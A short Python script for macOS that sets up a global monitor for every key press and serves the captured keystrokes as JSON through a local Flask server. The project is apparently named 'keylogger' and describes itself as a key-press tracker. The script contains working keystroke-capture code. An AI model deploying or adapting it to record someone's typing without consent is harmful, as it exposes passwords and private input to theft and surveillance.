import argparse
from threading import Thread

# noinspection PyUnresolvedReferences
from AppKit import NSApplication, NSApp
# noinspection PyUnresolvedReferences
from Cocoa import NSEvent, NSEventMaskKeyDown
# noinspection PyUnresolvedReferences
from Foundation import NSObject
from PyObjCTools import AppHelper
from flask import Flask

from src.keylogger.watcher import Watcher

server = Flask(__name__)
parser = argparse.ArgumentParser(description='A simple server to track keyboard presses.')
parser.add_argument('--port', '-p', dest='port', action='store', default=8080,
                    help='The port to run the server on. (default: 8080)')
args = parser.parse_args()


@server.route('/keyToggles', methods=['GET'])
def key_toggles():
    return watcher.get_key_toggles_as_json()


@server.route('/keyStrokes', methods=['GET'])
def key_strokes():
    response = watcher.get_key_strokes_as_json()
    watcher.key_strokes.clear()
    return response


class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, notification):
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(NSEventMaskKeyDown, key_handler)


def key_handler(event):
    try:
        capture_raw = event.keyCode()
        print(event, '->', event.type(), hex(event.modifierFlags()), '->', event.keyCode())
        watcher.watch(capture_raw)
    except KeyboardInterrupt:
        AppHelper.stopEventLoop()


def start_server():
    server.run(port=args.port)


if __name__ == '__main__':
    Thread(target=start_server).start()

    watcher = Watcher()
    NSApplication.sharedApplication()
    NSApp().setDelegate_(AppDelegate.alloc().init())
    AppHelper.runEventLoop()
